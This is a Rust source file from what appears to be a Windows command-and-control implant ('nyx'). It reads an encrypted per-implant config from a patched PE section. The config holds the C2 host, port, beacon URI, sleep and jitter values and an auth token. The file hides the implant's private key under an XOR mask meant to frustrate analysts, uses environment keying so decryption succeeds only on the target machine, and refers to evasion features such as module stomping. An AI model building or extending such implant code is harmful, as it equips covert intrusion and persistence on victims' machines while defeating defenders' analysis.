//! Runtime config loader from the `.nyx_cfg` PE section.
//!
//! The build-time DLL template carries a 1024-byte `.nyx_cfg` section filled
//! with `0xAA` (magic `0x41414141` = unpatched). At implant-generation time the
//! server patches this section with the per-implant config:
//!
//! ```text
//! [0xDEADBEEF magic (4B LE)]
//! [keying_levels    (4B LE)]  -- env-keying bitmap (0 = disabled)
//! [config_data_len  (2B LE)]  -- nonce + ct + tag bytes (12+N+16)
//! [implant_priv     (32B)]    -- X25519 static secret, PLAINTEXT
//! [config_nonce     (12B)]
//! [encrypted_config (N B)]    -- ChaCha20-Poly1305 AEAD
//! [poly1305_tag     (16B)]
//! [padding to 1024B]
//! ```
//!
//! The implant derives the config encryption key via:
//!   shared = X25519_ECDH(implant_priv, baked_server_pub)
//!   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
//!                            server_pub || implant_pub)
//!
//! If the section is unpatched (magic `0x41414141`), we fall back to the
//! compile-time config baked by `build.rs` — the dev/CI path.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use nyx_protocol::wire::{Reader, WireError};

/// Returns (module_base, .nyx_cfg_section_ptr), or None if the section is not found.
fn nyx_cfg_ptr() -> Option<(*const u8, *const u8)> {
    extern "C" {
        static __ImageBase: u8;
    }
    let base = unsafe { &__ImageBase as *const u8 };

    let dos_header = base;
    let pe_offset = unsafe { *(dos_header.add(0x3C) as *const i32) } as isize;
    if pe_offset <= 0 {
        return None;
    }
    let pe_header = unsafe { base.offset(pe_offset) };
    let coff = unsafe { pe_header.add(4) };
    let num_sections = unsafe { *(coff.add(2) as *const u16) } as usize;
    let opt_header_size = unsafe { *(coff.add(16) as *const u16) } as isize;
    let sections = unsafe { coff.add(20).offset(opt_header_size) };
    const SECTION_HEADER_SIZE: isize = 40;

    for i in 0..num_sections {
        let sh = unsafe { sections.offset(i as isize * SECTION_HEADER_SIZE) };
        let name = unsafe { core::slice::from_raw_parts(sh, 8) };
        if &name[..7] == b".nyx_cf" && name[7] == b'g' {
            let rva = unsafe { *(sh.add(12) as *const u32) } as isize;
            return Some((base, unsafe { base.offset(rva) }));
        }
    }
    None
}

/// Derive a 32-byte obfuscation mask from PE header bytes.
///
/// This mask is XOR'd with the implant's X25519 private key before writing it
/// to `.nyx_cfg`, so the key is never in plaintext on disk. The server
/// computes the same mask at generation time via `derive_mask_from_bytes()` in
/// `crates/server/src/implant_gen.rs` — both sides MUST produce identical output.
///
/// Not cryptographic: an analyst who reverse-engineers the algorithm can
/// recover the key. But it defeats trivial static extraction (grep for
/// 0xDEADBEEF → read 32 bytes → key in hand). Recovery now requires
/// understanding the XOR scheme and replicating the header mixing.
fn compute_pe_mask(base: *const u8) -> [u8; 32] {
    let header_len = core::cmp::min(4096usize, 0x1000);
    let header = unsafe { core::slice::from_raw_parts(base, header_len) };
    derive_mask_from_bytes(header)
}

/// Core mask derivation: XOR-stride accumulation over the input bytes.
/// MUST match the server-side copy of this function exactly.
fn derive_mask_from_bytes(data: &[u8]) -> [u8; 32] {
    let mut mask = [0x5Au8; 32]; // non-zero seed
    for (j, &b) in data.iter().enumerate() {
        mask[j % 32] ^= b;
        let idx = (j.wrapping_mul(17).wrapping_add(7)) % 32;
        mask[idx] = mask[idx].wrapping_add(b).rotate_left((j % 7) as u32);
    }
    mask
}

/// Extra fields that may come from a per-implant (patched) config.
/// All fields are optional — compile-time builds have them all as `None`/`0`.
#[derive(Debug, Clone)]
pub struct ImplantConfig {
    /// One-time auth token (32 bytes) for first check-in validation.
    pub auth_token: Option<[u8; 32]>,
    /// Per-implant X25519 keypair (replaces per-session ephemeral generation).
    /// When set, the beacon loop uses this keypair instead of calling
    /// `ImplantKeypair::generate()`.
    pub implant_priv: Option<[u8; 32]>,
    /// Features bitmap (foliage, module_stomp, hwbp_blind, etc.).
    pub features_bitmap: u32,
    /// Number of environment keying HKDF layers (0 = disabled).
    pub keying_levels: u32,
    /// Unix timestamp after which the implant self-terminates (0 = no expiry).
    pub expires_at: u64,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            auth_token: None,
            implant_priv: None,
            features_bitmap: 0,
            keying_levels: 0,
            expires_at: 0,
        }
    }
}

/// Load the runtime config.
///
/// 1. Check if the `.nyx_cfg` section has been patched (magic `0xDEADBEEF`).
///    If so, derive the per-implant config key via ECDH+HKDF, decrypt the
///    config blob, decode the fields, and return them.
/// 2. If not patched (magic `0x41414141` or section missing), fall back to
///    the compile-time `config::load()`.
///
/// Returns `(Config, ImplantConfig, plaintext_bytes)`.
/// The caller MUST register the plaintext bytes with `mem::register_owned` to
/// keep them in maskable memory.
pub fn load_runtime_config(
) -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
    let (base, ptr) = nyx_cfg_ptr()?;
    let section = unsafe { core::slice::from_raw_parts(ptr, 1024) };

    // Read magic (4 bytes LE)
    let magic = u32::from_le_bytes([section[0], section[1], section[2], section[3]]);

    if magic == 0x41414141 {
        // Unpatched — fall back to compile-time config.
        return None;
    }

    if magic != 0xDEADBEEF {
        // Unknown magic — corrupt or hand-modified binary. Fall back.
        return None;
    }

    // Patched. Read env-keying bitmap (u32 LE at bytes 4-7).
    let keying_levels = u32::from_le_bytes([section[4], section[5], section[6], section[7]]);

    // Read config data length (u16 LE at bytes 8-9).
    let data_len = u16::from_le_bytes([section[8], section[9]]) as usize;
    if data_len == 0 || data_len > 900 {
        // Sanity: config data can't be empty or improbably large.
        return None;
    }

    // Read obfuscated implant private key (32B at bytes 10-41).
    // The key is XOR-obfuscated with a per-template mask — it is never stored
    // in plaintext on disk. We must reverse the XOR before using it.
    let obfuscated_priv: [u8; 32] = section[10..42].try_into().ok()?;
    let pe_mask = compute_pe_mask(base);
    let mut implant_priv = obfuscated_priv;
    for i in 0..32 {
        implant_priv[i] ^= pe_mask[i];
    }

    // Read config nonce (12B at bytes 42-53).
    let config_nonce: [u8; 12] = section[42..54].try_into().ok()?;

    // Read encrypted config + tag (bytes 54..54+data_len).
    if 54 + data_len > 1024 {
        return None;
    }
    let ct_with_tag = &section[54..54 + data_len];

    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF-SHA256.
    let server_pub = crate::server_pub::SERVER_PUB;
    let mut config_key = derive_config_key(&implant_priv, &server_pub)?;

    // Apply environment keying layers BEFORE decryption so the AEAD tag
    // check enforces the target environment.  If keying_levels is 0 this is
    // a no-op; otherwise each active layer mixes HKDF-SHA256 over the current
    // key and the environment-specific data.  Missing env data (PEB walk
    // failure) skips that layer gracefully.
    if keying_levels != 0 {
        crate::env_keying::apply_layers(&mut config_key, keying_levels);
    }

    // Decrypt with ChaCha20-Poly1305.
    let plaintext = decrypt_config(&config_key, &config_nonce, ct_with_tag)?;

    // The plaintext contains: [server_host str][server_port u16][beacon_uri str]
    //   [sleep_seconds u32][jitter_pct u8][use_tls u8]
    //   [auth_token presence(0/1) + optional 32B]
    //   [features_bitmap u32][keying_levels u32][expires_at u64]
    let mut r = Reader::new(&plaintext);
    let server_host = r.str().ok()?;
    let server_port = r.u16().ok()?;
    let beacon_uri = r.str().ok()?;
    let sleep_seconds = r.u32().ok()?;
    let jitter_pct = r.u8().ok()?;
    let use_tls = r.u8().ok()? != 0;

    // Auth token: presence byte + optional 32B
    let auth_token = if r.remaining() > 0 {
        let has_token = r.u8().ok()?;
        if has_token == 1 {
            let b = r.blob().ok()?;
            if b.len() != 32 {
                return None;
            }
            let mut token = [0u8; 32];
            token.copy_from_slice(b);
            Some(token)
        } else {
            None
        }
    } else {
        None
    };

    let features_bitmap = r.u32().ok().unwrap_or(0);
    // keying_levels is read from the section header (unencrypted) above and is
    // authoritative.  The plaintext copy is consumed for backward compat with
    // older server builds that still embed it, but we discard the value.
    let _keying_levels_plain = r.u32().ok().unwrap_or(0);
    let expires_at = r.u64().ok().unwrap_or(0);

    let cfg = crate::config::Config {
        server_host,
        server_port,
        beacon_uri,
        server_pub,
        sleep_seconds,
        jitter_pct,
        use_tls,
    };

    let implant = ImplantConfig {
        auth_token,
        implant_priv: Some(implant_priv),
        features_bitmap,
        keying_levels,
        expires_at,
    };

    Some((cfg, implant, plaintext))
}

/// Derive the per-implant config encryption key:
///   shared = X25519_ECDH(implant_priv, server_pub)
///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
///                            server_pub || implant_pub)
fn derive_config_key(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[u8; 32]> {
    use nyx_protocol::crypto;

    // Compute implant public key from private key
    let implant_pub = crypto::public_from_secret(implant_priv)?;

    // ECDH: implant_priv × server_pub → shared secret
    let shared = crypto::ecdh(implant_priv, server_pub)?;

    // HKDF-SHA256: info = server_pub || implant_pub
    let mut info = [0u8; 64];
    info[..32].copy_from_slice(server_pub);
    info[32..].copy_from_slice(&implant_pub);

    let mut okm = [0u8; 32];
    crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm);
    Some(okm)
}

/// ChaCha20-Poly1305 decrypt `ct_with_tag` (ciphertext || 16B tag) under
/// `key` and `nonce`. Returns the plaintext on success (AEAD tag verified),
/// or `None` on failure.
fn decrypt_config(key: &[u8; 32], nonce: &[u8; 12], ct_with_tag: &[u8]) -> Option<Vec<u8>> {
    if ct_with_tag.len() < 17 {
        return None; // too short for tag
    }
    // We need ChaCha20-Poly1305. The nyx-config crate has `decrypt`, but it
    // requires CONFIG_KEY, CONFIG_NONCE, CONFIG_CT as statics. We have runtime
    // values. Use the protocol crate's crypto primitives directly.
    //
    // The simplest approach: use chacha20poly1305 crate directly.
    // But we're in no_std. The nyx-config crate uses chacha20poly1305 with the
    // `aead` trait. Let's check if that's available.
    //
    // Actually, we can use the crypto::decrypt_config function that we'll add
    // to the protocol crate. For now, delegate to the crypto module.
    nyx_protocol::crypto::aead_decrypt(key, nonce, ct_with_tag)
}
